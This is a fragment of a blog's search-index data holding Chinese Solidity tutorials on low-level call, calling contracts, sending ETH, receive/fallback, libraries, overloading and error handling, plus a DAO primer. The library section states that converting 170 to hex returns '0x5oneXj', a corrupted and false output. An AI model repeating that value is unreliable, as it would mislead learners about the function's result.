","date":"2021-08-29","objectID":"/posts/solidity-delegatecall.html:4:0","tags":["solidity","basic"],"title":"低级成员函数Delegatecall委托调用的用法","uri":"/posts/solidity-delegatecall.html"},{"categories":["基础知识","Solidity 进阶"],"content":"Call call 是address类型的低级成员函数，它用来与其他合约交互。它的返回值为(bool, data)，分别对应call是否成功以及目标函数的返回值。 call是solidity官方推荐的通过触发fallback或receive函数发送ETH的方法。 不推荐用call来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数。 当我们不知道对方合约的源代码或ABI，就没法生成合约变量；这时，我们仍可以通过call调用对方合约的函数。 ","date":"2021-08-13","objectID":"/posts/solidity-call.html:1:0","tags":["solidity","basic"],"title":"低级成员函数Call与其他合约交互","uri":"/posts/solidity-call.html"},{"categories":["基础知识","Solidity 进阶"],"content":"call的使用规则 call的使用规则如下： 目标合约地址.call(二进制编码); 其中二进制编码利用结构化编码函数abi.encodeWithSignature获得，abi.encodeWithSignature(“函数签名”, 逗号分隔的具体参数)，函数签名为\"函数名（逗号分隔的参数类型)\"。： abi.encodeWithSignature(\"f(uint256,address)\", _x, _addr) 另外call在调用合约时可以指定交易发送的ETH数额和gas： 目标合约地址.call{value:发送数额, gas:gas数额}(二进制编码); 看起来有点复杂，下面我们举个call应用的例子。 ","date":"2021-08-13","objectID":"/posts/solidity-call.html:1:1","tags":["solidity","basic"],"title":"低级成员函数Call与其他合约交互","uri":"/posts/solidity-call.html"},{"categories":["基础知识","Solidity 进阶"],"content":"目标合约 我们先写一个简单的目标合约OtherContract并部署，代码与第19讲中基本相同，只是多了fallback函数。 contract OtherContract { uint256 private _x = 0; // 状态变量x // 收到eth的事件，记录amount和gas event Log(uint amount, uint gas); fallback() external payable{} // 返回合约ETH余额 function getBalance() view public returns(uint) { return address(this).balance; } // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable) function setX(uint256 x) external payable{ _x = x; // 如果转入ETH，则释放Log事件 if(msg.value \u003e 0){ emit Log(msg.value, gasleft()); } } // 读取x function getX() external view returns(uint x){ x = _x; } } 这个合约包含一个状态变量x，一个在收到ETH时触发的事件Log，三个函数： getBalance(): 返回合约ETH余额。 setX(): external payable函数，可以设置x的值，并向合约发送ETH。 getX(): 读取x的值。 ","date":"2021-08-13","objectID":"/posts/solidity-call.html:1:2","tags":["solidity","basic"],"title":"低级成员函数Call与其他合约交互","uri":"/posts/solidity-call.html"},{"categories":["基础知识","Solidity 进阶"],"content":"利用call调用目标合约 1. Response事件 我们写一个Call合约来调用目标合约函数。首先定义一个Response事件，输出call返回的success和data，方便我们观察返回值。 // 定义Response事件，输出call返回的结果success和data event Response(bool success, bytes data); 2. 调用setX函数 我们定义callSetX函数来调用目标合约的setX()，转入msg.value数额的ETH，并释放Response事件输出success和data： function callSetX(address payable _addr, uint256 x) public payable { // call setX()，同时可以发送ETH (bool success, bytes memory data) = _addr.call{value: msg.value}( abi.encodeWithSignature(\"setX(uint256)\", x) ); emit Response(success, data); //释放事件 } 接下来我们调用callSetX把状态变量_x改为5，参数为OtherContract地址和5，由于目标函数setX()没有返回值，因此Response事件输出的data为0x，也就是空。 3. 调用getX函数 下面我们调用getX()函数，它将返回目标合约_x的值，类型为uint256。我们可以利用abi.decode来解码call的返回值data，并读出数值。 function callGetX(address _addr) external returns(uint256){ // call getX() (bool success, bytes memory data) = _addr.call( abi.encodeWithSignature(\"getX()\") ); emit Response(success, data); //释放事件 return abi.decode(data, (uint256)); } 从Response事件的输出，我们可以看到data为0x0000000000000000000000000000000000000000000000000000000000000005。而经过abi.decode，最终返回值为5。 4. 调用不存在的函数 如果我们给call输入的函数不存在于目标合约，那么目标合约的fallback函数会被触发。 function callNonExist(address _addr) external{ // call getX() (bool success, bytes memory data) = _addr.call( abi.encodeWithSignature(\"foo(uint256)\") ); emit Response(success, data); //释放事件 } 上面例子中，我们call了不存在的foo函数。call仍能执行成功，并返回success，但其实调用的目标合约fallback函数。 ","date":"2021-08-13","objectID":"/posts/solidity-call.html:1:3","tags":["solidity","basic"],"title":"低级成员函数Call与其他合约交互","uri":"/posts/solidity-call.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 call不是调用合约的推荐方法，因为不安全。但他能让我们在不知道源代码和ABI的情况下调用目标合约，很有用。 ","date":"2021-08-13","objectID":"/posts/solidity-call.html:2:0","tags":["solidity","basic"],"title":"低级成员函数Call与其他合约交互","uri":"/posts/solidity-call.html"},{"categories":["基础知识","Solidity 进阶"],"content":"import用法 通过源文件相对位置导入，例子： 文件结构 ├── Import.sol └── Yeye.sol // 通过文件相对位置import import './Yeye.sol'; 通过源文件网址导入网上的合约的全局符号，例子： // 通过网址引用 import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol'; 通过npm的目录导入，例子： import '@openzeppelin/contracts/access/Ownable.sol'; 通过指定全局符号导入合约特定的全局符号，例子： import {Yeye} from './Yeye.sol'; 引用(import)在代码中的位置为：在声明版本号之后，在其余代码之前。 ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:1:0","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"调用已部署合约 开发者写智能合约来调用其他合约，这让以太坊网络上的程序可以复用，从而建立繁荣的生态。很多web3项目依赖于调用其他合约，比如收益农场（yield farming）。这一讲，我们介绍如何在已知合约代码（或接口）和地址情况下调用目标合约的函数。 ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:2:0","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"目标合约 我们先写一个简单的合约OtherContract来调用。 contract OtherContract { uint256 private _x = 0; // 状态变量_x // 收到eth的事件，记录amount和gas event Log(uint amount, uint gas); // 返回合约ETH余额 function getBalance() view public returns(uint) { return address(this).balance; } // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable) function setX(uint256 x) external payable{ _x = x; // 如果转入ETH，则释放Log事件 if(msg.value \u003e 0){ emit Log(msg.value, gasleft()); } } // 读取_x function getX() external view returns(uint x){ x = _x; } } 这个合约包含一个状态变量_x，一个事件Log在收到ETH时触发，三个函数： getBalance(): 返回合约ETH余额。 setX(): external payable函数，可以设置_x的值，并向合约发送ETH。 getX(): 读取_x的值。 ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:3:0","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"调用OtherContract合约 我们可以利用合约的地址和合约代码（或接口）来创建合约的引用：_Name(_Address)，其中_Name是合约名，应与合约代码（或接口）中标注的合约名保持一致，_Address是合约地址。然后用合约的引用来调用它的函数：_Name(_Address).f()，其中f()是要调用的函数。 下面我们介绍4个调用合约的例子，在remix中编译合约后，分别部署OtherContract和CallContract： ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:4:0","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"1. 传入合约地址 我们可以在函数里传入目标合约地址，生成目标合约的引用，然后调用目标函数。以调用OtherContract合约的setX函数为例，我们在新合约中写一个callSetX函数，传入已部署好的OtherContract合约地址_Address和setX的参数x： function callSetX(address _Address, uint256 x) external{ OtherContract(_Address).setX(x); } 复制OtherContract合约的地址，填入callSetX函数的参数中，成功调用后，调用OtherContract合约中的getX验证x变为123 ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:4:1","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"2. 传入合约变量 我们可以直接在函数里传入合约的引用，只需要把上面参数的address类型改为目标合约名，比如OtherContract。下面例子实现了调用目标合约的getX()函数。 注意该函数参数OtherContract _Address底层类型仍然是address，生成的ABI中、调用callGetX时传入的参数都是address类型 function callGetX(OtherContract _Address) external view returns(uint x){ x = _Address.getX(); } 复制OtherContract合约的地址，填入callGetX函数的参数中，调用后成功获取x的值 ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:4:2","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"3. 创建合约变量 我们可以创建合约变量，然后通过它来调用目标函数。下面例子，我们给变量oc存储了OtherContract合约的引用： function callGetX2(address _Address) external view returns(uint x){ OtherContract oc = OtherContract(_Address); x = oc.getX(); } 复制OtherContract合约的地址，填入callGetX2函数的参数中，调用后成功获取x的值 ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:4:3","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"4. 调用合约并发送ETH 如果目标合约的函数是payable的，那么我们可以通过调用它来给合约转账：_Name(_Address).f{value: _Value}()，其中_Name是合约名，_Address是合约地址，f是目标函数名，_Value是要转的ETH数额（以wei为单位）。 OtherContract合约的setX函数是payable的，在下面这个例子中我们通过调用setX来往目标合约转账。 function setXTransferETH(address otherContract, uint256 x) payable external{ OtherContract(otherContract).setX{value: msg.value}(x); } 复制OtherContract合约的地址，填入setXTransferETH函数的参数中，并转入10ETH 转账后，我们可以通过Log事件和getBalance()函数观察目标合约ETH余额的变化。 ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:4:4","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 通过目标合约代码（或接口）和地址来创建合约的引用，从而调用目标合约的函数。 ","date":"2021-08-04","objectID":"/posts/solidity-call-contract.html:5:0","tags":["solidity","basic"],"title":"如何调用其他合约？","uri":"/posts/solidity-call-contract.html"},{"categories":["基础知识","Solidity 进阶"],"content":" 引言 Solidity有三种方法向其他合约发送ETH，他们是：transfer()，send()和call()，其中call()是被鼓励的用法。 ","date":"2021-07-28","objectID":"/posts/solidity-transfer-eth.html:0:0","tags":["solidity","basic","transfer","send","call"],"title":"发送ETH的三种方式及比较","uri":"/posts/solidity-transfer-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"接收ETH合约 我们先部署一个接收ETH合约ReceiveETH。ReceiveETH合约里有一个事件Log，记录收到的ETH数量和gas剩余。还有两个函数，一个是receive()函数，收到ETH被触发，并发送Log事件；另一个是查询合约ETH余额的getBalance()函数。 contract ReceiveETH { // 收到eth事件，记录amount和gas event Log(uint amount, uint gas); // receive方法，接收eth时被触发 receive() external payable{ emit Log(msg.value, gasleft()); } // 返回合约ETH余额 function getBalance() view public returns(uint) { return address(this).balance; } } 部署ReceiveETH合约后，运行getBalance()函数，可以看到当前合约的ETH余额为0。 ","date":"2021-07-28","objectID":"/posts/solidity-transfer-eth.html:1:0","tags":["solidity","basic","transfer","send","call"],"title":"发送ETH的三种方式及比较","uri":"/posts/solidity-transfer-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"发送ETH合约 我们将实现三种方法向ReceiveETH合约发送ETH。首先，先在发送ETH合约SendETH中实现payable的构造函数和receive()，让我们能够在部署时和部署后向合约转账。 contract SendETH { // 构造函数，payable使得部署的时候可以转eth进去 constructor() payable{} // receive方法，接收eth时被触发 receive() external payable{} } ","date":"2021-07-28","objectID":"/posts/solidity-transfer-eth.html:2:0","tags":["solidity","basic","transfer","send","call"],"title":"发送ETH的三种方式及比较","uri":"/posts/solidity-transfer-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"transfer 用法是接收方地址.transfer(发送ETH数额)。 transfer()的gas限制是2300，足够用于转账，但对方合约的fallback()或receive()函数不能实现太复杂的逻辑。 transfer()如果转账失败，会自动revert（回滚交易）。 代码样例，注意里面的_to填ReceiveETH合约的地址，amount是ETH转账金额： // 用transfer()发送ETH function transferETH(address payable _to, uint256 amount) external payable{ _to.transfer(amount); } 部署SendETH合约后，对ReceiveETH合约发送ETH，此时amount为10，value为0，amount\u003evalue，转账失败，发生revert。 此时amount为10，value为10，amount\u003c=value，转账成功。 在ReceiveETH合约中，运行getBalance()函数，可以看到当前合约的ETH余额为10。 ","date":"2021-07-28","objectID":"/posts/solidity-transfer-eth.html:2:1","tags":["solidity","basic","transfer","send","call"],"title":"发送ETH的三种方式及比较","uri":"/posts/solidity-transfer-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"send 用法是接收方地址.send(发送ETH数额)。 send()的gas限制是2300，足够用于转账，但对方合约的fallback()或receive()函数不能实现太复杂的逻辑。 send()如果转账失败，不会revert。 send()的返回值是bool，代表着转账成功或失败，需要额外代码处理一下。 代码样例： // send()发送ETH function sendETH(address payable _to, uint256 amount) external payable{ // 处理下send的返回值，如果失败，revert交易并发送error bool success = _to.send(amount); if(!success){ revert SendFailed(); } } 对ReceiveETH合约发送ETH，此时amount为10，value为0，amount\u003evalue，转账失败，因为经过处理，所以发生revert。 此时amount为10，value为11，amount\u003c=value，转账成功。 ","date":"2021-07-28","objectID":"/posts/solidity-transfer-eth.html:2:2","tags":["solidity","basic","transfer","send","call"],"title":"发送ETH的三种方式及比较","uri":"/posts/solidity-transfer-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"call 用法是接收方地址.call{value: 发送ETH数额}(\"\")。 call()没有gas限制，可以支持对方合约fallback()或receive()函数实现复杂逻辑。 call()如果转账失败，不会revert。 call()的返回值是(bool, data)，其中bool代表着转账成功或失败，需要额外代码处理一下。 代码样例： // call()发送ETH function callETH(address payable _to, uint256 amount) external payable{ // 处理下call的返回值，如果失败，revert交易并发送error (bool success,) = _to.call{value: amount}(\"\"); if(!success){ revert CallFailed(); } } 对ReceiveETH合约发送ETH，此时amount为10，value为0，amount\u003evalue，转账失败，因为经过处理，所以发生revert。 此时amount为10，value为11，amount\u003c=value，转账成功。 运行三种方法，可以看到，他们都可以成功地向ReceiveETH合约发送ETH。 ","date":"2021-07-28","objectID":"/posts/solidity-transfer-eth.html:2:3","tags":["solidity","basic","transfer","send","call"],"title":"发送ETH的三种方式及比较","uri":"/posts/solidity-transfer-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"transfer，send 和 call 的比较 call：call没有gas限制，最为灵活，是最提倡的方法； transfer：transfer有2300 gas限制，但是发送失败会自动revert交易，是次优选择； send：send有2300 gas限制，而且发送失败不会自动revert交易，几乎没有人用它。 ","date":"2021-07-28","objectID":"/posts/solidity-transfer-eth.html:3:0","tags":["solidity","basic","transfer","send","call"],"title":"发送ETH的三种方式及比较","uri":"/posts/solidity-transfer-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":" 引言 Solidity支持两种特殊的回调函数，receive()和fallback()，他们主要在两种情况下被使用： 接收ETH 处理合约中不存在的函数调用（代理合约proxy contract） 注意⚠️：在solidity 0.6.x版本之前，语法上只有 fallback() 函数，用来接收用户发送的ETH时调用以及在被调用函数签名没有匹配到时，来调用。 0.6版本之后，solidity才将 fallback() 函数拆分成 receive() 和 fallback() 两个函数。 ","date":"2021-07-19","objectID":"/posts/solidity-receive-eth.html:0:0","tags":["solidity","basic","receive","fallback"],"title":"合约接收ETH（receive和fallback）","uri":"/posts/solidity-receive-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"接收ETH函数 receive receive()只用于处理接收ETH。一个合约最多有一个receive()函数，声明方式与一般函数不一样，不需要function关键字：receive() external payable { ... }。receive()函数不能有任何的参数，不能返回任何值，必须包含external和payable。 当合约接收ETH的时候，receive()会被触发。receive()最好不要执行太多的逻辑因为如果别人用send和transfer方法发送ETH的话，gas会限制在2300，receive()太复杂可能会触发Out of Gas报错；如果用call就可以自定义gas执行更复杂的逻辑（这三种发送ETH的方法我们之后会讲到）。 我们可以在receive()里发送一个event，例如： // 定义事件 event Received(address Sender, uint Value); // 接收ETH时释放Received事件 receive() external payable { emit Received(msg.sender, msg.value); } 有些恶意合约，会在receive() 函数（老版本的话，就是 fallback() 函数）嵌入恶意消耗gas的内容或者使得执行故意失败的代码，导致一些包含退款和转账逻辑的合约不能正常工作，因此写包含退款等逻辑的合约时候，一定要注意这种情况。 ","date":"2021-07-19","objectID":"/posts/solidity-receive-eth.html:1:0","tags":["solidity","basic","receive","fallback"],"title":"合约接收ETH（receive和fallback）","uri":"/posts/solidity-receive-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"回退函数 fallback fallback()函数会在调用合约不存在的函数时被触发。可用于接收ETH，也可以用于代理合约proxy contract。fallback()声明时不需要function关键字，必须由external修饰，一般也会用payable修饰，用于接收ETH:fallback() external payable { ... }。 我们定义一个fallback()函数，被触发时候会释放fallbackCalled事件，并输出msg.sender，msg.value和msg.data: event fallbackCalled(address Sender, uint Value, bytes Data); // fallback fallback() external payable{ emit fallbackCalled(msg.sender, msg.value, msg.data); } ","date":"2021-07-19","objectID":"/posts/solidity-receive-eth.html:2:0","tags":["solidity","basic","receive","fallback"],"title":"合约接收ETH（receive和fallback）","uri":"/posts/solidity-receive-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"receive和fallback的区别 receive和fallback都能够用于接收ETH，他们触发的规则如下： 触发fallback() 还是 receive()? 接收ETH | msg.data是空？ / \\ 是 否 / \\ receive()存在? fallback() / \\ 是 否 / \\ receive() fallback() 简单来说，合约接收ETH时，msg.data为空且存在receive()时，会触发receive()；msg.data不为空或不存在receive()时，会触发fallback()，此时fallback()必须为payable。 receive()和payable fallback()均不存在的时候，向合约直接发送ETH将会报错（你仍可以通过带有payable的函数向合约发送ETH）。 ","date":"2021-07-19","objectID":"/posts/solidity-receive-eth.html:3:0","tags":["solidity","basic","receive","fallback"],"title":"合约接收ETH（receive和fallback）","uri":"/posts/solidity-receive-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 receive()和fallback()，他们主要在两种情况下被使用，他们主要用于处理接收ETH和代理合约proxy contract。 ","date":"2021-07-19","objectID":"/posts/solidity-receive-eth.html:4:0","tags":["solidity","basic","receive","fallback"],"title":"合约接收ETH（receive和fallback）","uri":"/posts/solidity-receive-eth.html"},{"categories":["基础知识","Solidity 进阶"],"content":"库函数 库函数是一种特殊的合约，为了提升solidity代码的复用性和减少gas而存在。库合约一般都是一些好用的函数合集（库函数），由大神或者项目方创作，咱们站在巨人的肩膀上，会用就行了。 他和普通合约主要有以下几点不同： 不能存在状态变量 不能够继承或被继承 不能接收以太币 不可以被销毁 ","date":"2021-07-12","objectID":"/posts/solidity-library.html:1:0","tags":["solidity","basic","import"],"title":"库合约（library）站在巨人的肩膀上","uri":"/posts/solidity-library.html"},{"categories":["基础知识","Solidity 进阶"],"content":"String库合约 String库合约是将uint256类型转换为相应的string类型的代码库，样例代码如下： library Strings { bytes16 private constant _HEX_SYMBOLS = \"0123456789abcdef\"; /** * @dev Converts a `uint256` to its ASCII `string` decimal representation. */ function toString(uint256 value) public pure returns (string memory) { // Inspired by OraclizeAPI's implementation - MIT licence // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol if (value == 0) { return \"0\"; } uint256 temp = value; uint256 digits; while (temp != 0) { digits++; temp /= 10; } bytes memory buffer = new bytes(digits); while (value != 0) { digits -= 1; buffer[digits] = bytes1(uint8(48 + uint256(value % 10))); value /= 10; } return string(buffer); } /** * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation. */ function toHexString(uint256 value) public pure returns (string memory) { if (value == 0) { return \"0x00\"; } uint256 temp = value; uint256 length = 0; while (temp != 0) { length++; temp \u003e\u003e= 8; } return toHexString(value, length); } /** * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length. */ function toHexString(uint256 value, uint256 length) public pure returns (string memory) { bytes memory buffer = new bytes(2 * length + 2); buffer[0] = \"0\"; buffer[1] = \"x\"; for (uint256 i = 2 * length + 1; i \u003e 1; --i) { buffer[i] = _HEX_SYMBOLS[value \u0026 0xf]; value \u003e\u003e= 4; } require(value == 0, \"Strings: hex length insufficient\"); return string(buffer); } } 他主要包含两个函数，toString()将uint256转为string，toHexString()将uint256转换为16进制，在转换为string。 ","date":"2021-07-12","objectID":"/posts/solidity-library.html:2:0","tags":["solidity","basic","import"],"title":"库合约（library）站在巨人的肩膀上","uri":"/posts/solidity-library.html"},{"categories":["基础知识","Solidity 进阶"],"content":"如何使用库合约 我们用String库函数的toHexString()来演示两种使用库合约中函数的办法。 1. 利用using for指令 指令using A for B;可用于附加库函数（从库 A）到任何类型（B）。添加完指令后，库A中的函数会自动添加为B类型变量的成员，可以直接调用。注意：在调用的时候，这个变量会被当作第一个参数传递给函数： // 利用using for指令 using Strings for uint256; function getString1(uint256 _number) public pure returns(string memory){ // 库函数会自动添加为uint256型变量的成员 return _number.toHexString(); } 2. 通过库合约名称调用库函数 // 直接通过库合约名调用 function getString2(uint256 _number) public pure returns(string memory){ return Strings.toHexString(_number); } 我们部署合约并输入170测试一下，两种方法均能返回正确的16进制string “0x5oneXj”。证明我们调用库函数成功！ ","date":"2021-07-12","objectID":"/posts/solidity-library.html:2:1","tags":["solidity","basic","import"],"title":"库合约（library）站在巨人的肩膀上","uri":"/posts/solidity-library.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 这一讲，我们用ERC721的引用的库函数String为例介绍solidity中的库函数（Library）。99%的开发者都不需要自己去写库合约，会用大神写的就可以了。我们只需要知道什么情况该用什么库合约。常用的有： String：将uint256转换为String Address：判断某个地址是否为合约地址 Create2：更安全的使用Create2 EVM opcode Arrays：跟数组相关的库函数 ","date":"2021-07-12","objectID":"/posts/solidity-library.html:3:0","tags":["solidity","basic","import"],"title":"库合约（library）站在巨人的肩膀上","uri":"/posts/solidity-library.html"},{"categories":["基础知识","Solidity 进阶"],"content":"重载 solidity中允许函数进行重载（overloading），即名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，solidity不允许修饰器（modifier）重载。 ","date":"2021-06-30","objectID":"/posts/solidity-overloading.html:1:0","tags":["solidity","basic"],"title":"进阶学习之函数重载","uri":"/posts/solidity-overloading.html"},{"categories":["基础知识","Solidity 进阶"],"content":"函数重载 举个例子，我们可以定义两个都叫saySomething()的函数，一个没有任何参数，输出\"Nothing\"；另一个接收一个string参数，输出这个string。 function saySomething() public pure returns(string memory){ return(\"Nothing\"); } function saySomething(string memory something) public pure returns(string memory){ return(something); } 最终重载函数在经过编译器编译后，由于不同的参数类型，都变成了不同的函数选择器（selector）。 以 Overloading.sol 合约为例，在 Remix 上编译部署后，分别调用重载函数 saySomething() 和 saySomething(string memory something)，可以看到他们返回了不同的结果，被区分为不同的函数。 ","date":"2021-06-30","objectID":"/posts/solidity-overloading.html:1:1","tags":["solidity","basic"],"title":"进阶学习之函数重载","uri":"/posts/solidity-overloading.html"},{"categories":["基础知识","Solidity 进阶"],"content":"实参匹配（Argument Matching） 在调用重载函数时，会把输入的实际参数和函数参数的变量类型做匹配。 如果出现多个匹配的重载函数，则会报错。下面这个例子有两个叫f()的函数，一个参数为uint8，另一个为uint256： function f(uint8 _in) public pure returns (uint8 out) { out = _in; } function f(uint256 _in) public pure returns (uint256 out) { out = _in; } 我们调用f(50)，因为50既可以被转换为uint8，也可以被转换为uint256，因此会报错。 ","date":"2021-06-30","objectID":"/posts/solidity-overloading.html:1:2","tags":["solidity","basic"],"title":"进阶学习之函数重载","uri":"/posts/solidity-overloading.html"},{"categories":["基础知识","Solidity 进阶"],"content":"总结 名字相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。 ","date":"2021-06-30","objectID":"/posts/solidity-overloading.html:2:0","tags":["solidity","basic"],"title":"进阶学习之函数重载","uri":"/posts/solidity-overloading.html"},{"categories":["基础知识","Solidity 基础"],"content":"异常 写智能合约经常会出bug，solidity中的异常命令帮助我们debug。 ","date":"2021-06-27","objectID":"/posts/solidity-exception.html:1:0","tags":["solidity","basic"],"title":"异常处理与三种异常的比较","uri":"/posts/solidity-exception.html"},{"categories":["基础知识","Solidity 基础"],"content":"Error error是solidity 0.8.4版本新加的内容，方便且高效（省gas）地向用户解释操作失败的原因，同时还可以在抛出异常的同时携带参数，帮助开发者更好地调试。人们可以在contract之外定义异常。下面，我们定义一个TransferNotOwner异常，当用户不是代币owner的时候尝试转账，会抛出错误： error TransferNotOwner(); // 自定义error 我们也可以定义一个携带参数的异常，来提示尝试转账的账户地址 error TransferNotOwner(address sender); // 自定义的带参数的error 在执行当中，error必须搭配revert（回退）命令使用。 function transferOwner1(uint256 tokenId, address newOwner) public { if(_owners[tokenId] != msg.sender){ revert TransferNotOwner(); // revert TransferNotOwner(msg.sender); } _owners[tokenId] = newOwner; } 我们定义了一个transferOwner1()函数，它会检查代币的owner是不是发起人，如果不是，就会抛出TransferNotOwner异常；如果是的话，就会转账。 ","date":"2021-06-27","objectID":"/posts/solidity-exception.html:1:1","tags":["solidity","basic"],"title":"异常处理与三种异常的比较","uri":"/posts/solidity-exception.html"},{"categories":["基础知识","Solidity 基础"],"content":"Require require命令是solidity 0.8版本之前抛出异常的常用方法，目前很多主流合约仍然还在使用它。它很好用，唯一的缺点就是gas随着描述异常的字符串长度增加，比error命令要高。使用方法：require(检查条件，\"异常的描述\")，当检查条件不成立的时候，就会抛出异常。 我们用require命令重写一下上面的transferOwner函数： function transferOwner2(uint256 tokenId, address newOwner) public { require(_owners[tokenId] == msg.sender, \"Transfer Not Owner\"); _owners[tokenId] = newOwner; } ","date":"2021-06-27","objectID":"/posts/solidity-exception.html:1:2","tags":["solidity","basic"],"title":"异常处理与三种异常的比较","uri":"/posts/solidity-exception.html"},{"categories":["基础知识","Solidity 基础"],"content":"Assert assert命令一般用于程序员写程序debug，因为它不能解释抛出异常的原因（比require少个字符串）。它的用法很简单，assert(检查条件），当检查条件不成立的时候，就会抛出异常。 我们用assert命令重写一下上面的transferOwner函数： function transferOwner3(uint256 tokenId, address newOwner) public { assert(_owners[tokenId] == msg.sender); _owners[tokenId] = newOwner; } ","date":"2021-06-27","objectID":"/posts/solidity-exception.html:1:3","tags":["solidity","basic"],"title":"异常处理与三种异常的比较","uri":"/posts/solidity-exception.html"},{"categories":["基础知识","Solidity 基础"],"content":"三种方法的gas比较 我们比较一下三种抛出异常的gas消耗，通过remix控制台的Debug按钮，能查到每次函数调用的gas消耗分别如下： （使用0.8.17版本编译） error方法gas消耗：24457 (加入参数后gas消耗：24660) require方法gas消耗：24755 assert方法gas消耗：24473 我们可以看到，error方法gas最少，其次是assert，require方法消耗gas最多！因此，error既可以告知用户抛出异常的原因，又能省gas，大家要多用！（注意，由于部署测试时间的不同，每个函数的gas消耗会有所不同，但是比较结果会是一致的。） 备注: Solidity 0.8.0之前的版本，assert抛出的是一个 panic exception，会把剩余的 gas 全部消耗，不会返还。更多细节见官方文档。 ","date":"2021-06-27","objectID":"/posts/solidity-exception.html:2:0","tags":["solidity","basic"],"title":"异常处理与三种异常的比较","uri":"/posts/solidity-exception.html"},{"categories":["基础知识","Solidity 基础"],"content":"总结 比较了三种方法的gas消耗。得出结论：error既可以告知用户抛出异常的原因，又能省gas。 ","date":"2021-06-27","objectID":"/posts/solidity-exception.html:3:0","tags":["solidity","basic"],"title":"异常处理与三种异常的比较","uri":"/posts/solidity-exception.html"},{"categories":["基础知识"],"content":" 引言 没有集中领导的、成员共同拥有的社区。 一种与互联网上的陌生人合作的安全方式。 一个为特定事业投入资金的安全场所。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:0:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"1 什么是去中心化自治组织？ 去中心化自治组织是指集体所有且由区块链监管的组织，为一个共同的使命而奋斗。 去中心化自治组织让全世界志同道合之士开展合作，而无需信赖一位宅心仁厚的领导来管理资金和运营。 没有可以随意花钱的首席执行官，也没有能够做假账的首席财务官。 取而代之的是，融入代码的基于区块链的规则规定组织如何运作以及资金如何使用。 去中心化自治组织拥有内部资产，未经该组织批准，任何人都无权动用。 决策通过提案和投票监管，确保组织中的每位成员都有发言权，一切都发生在链上，公开透明。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:1:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"2 我们为什么需要去中心化自治组织？ 与他人创办涉及资金和金钱的组织，需要对与合作对象高度信任。 不过，显然很难相信互联网上素不相识的人。 通过去中心化自治组织，您不需要相信组织中的其他人，只需要相信去中心化自治组织的代码就够了，它是 100% 公开透明的，任何人都可以验证。 这为全球合作和协调提供了许多新机会。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:2:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 (DAO)？","uri":"/posts/what-is-decentralized-autonomous-organization-dao.html"},{"categories":["基础知识"],"content":"3 去中心化自治组织与传统组织的对比 去中心化自治组织 通常是平等的，并且完全民主。 需要成员投票才能实施任何更改。 不需要可信的中间人就可以自动计算投票、执行结果。 以去中心化方式自动提供服务（例如慈善基金的分配）。 所有活动公开透明。 传统组织 通常等级鲜明。 可能部分人就能进行决策，也可能投票表决，具体取决于组织结构。 如果允许投票，则在内部计票，投票结果必须由人工处理。 需要人工处理或自动集中控制，易受操纵。 活动通常是私密进行，不向公众开放。 ","date":"2021-05-20","objectID":"/posts/what-is-decentralized-autonomous-organization-dao.html:3:0","tags":["基础知识","DAO"],"title":"什么是去中心化自治组织 